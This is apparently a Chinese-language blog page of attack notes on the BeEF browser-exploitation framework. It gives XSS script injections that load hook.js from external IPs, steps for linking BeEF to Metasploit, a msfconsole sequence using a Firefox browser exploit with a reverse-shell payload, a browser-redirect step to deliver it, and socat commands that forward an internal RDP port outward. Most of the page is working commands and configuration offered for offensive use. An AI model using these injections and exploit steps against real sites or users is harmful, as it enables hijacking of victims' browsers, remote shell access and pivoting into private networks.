---
layout: default
---
# ![](../img/hj.jpg)BEEF
```
beef
document.write("<script language='javascript' src='http://192.168.1.163:3000/hook.js'></script>");


检测xss
1，输入所有符号<>''"":()

2，浏览器firebug的html功能，看过滤

3.字数限制，可以firebug修改限制，再提交
<script type='text/javascript' src="http://45.32.128.61:3000/hook.js"></script>
结合metasploit 获得shell

1 /usr/share/beef-xss/config.yaml把metasploit enable 写成ture，可以改数据库用户名和密码，及beef用户名和密码，ip啥的不用动（树莓派在外网的话）

2....../extensions/metasploit/config.yaml 修改host ip 和callback host ip 并记住密码,ip都填外网ip
msf下load msgrpc ServerHost=192.168.1.100 Pass=abc123

3 ./beef -x

4 create a hook web 在/var/www/index.html并嵌入代码，这一步直接用demo也行

5 service apache2 start
service postgresql start

6 不关另开msfconsole,发送hook链接并去beefGUI,可以查看一些浏览器信息进而获得session

==========================================================以下为无法用beef调用msf模块时，手动msf获取shell=======================================
7在msf可用browser_autopwn
也可:load msgrpc serverhost=ip pass=上面记住的密码
然后use exploit/multi/browser/firefox_froxy_prototype
set srvhost lhost uripath /
set payload firefox/shell_reverse_tcp exploit

8 去GUI把上面获得的链接覆盖到hooked domain 下redirect browser 中执行

9去msf等待session

端口转发
socat tcp-listen:1234 tcp-listen:3389
socat tcp:outerhost:1234 tcp:10.10.10.128:3389
```


__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./tools)
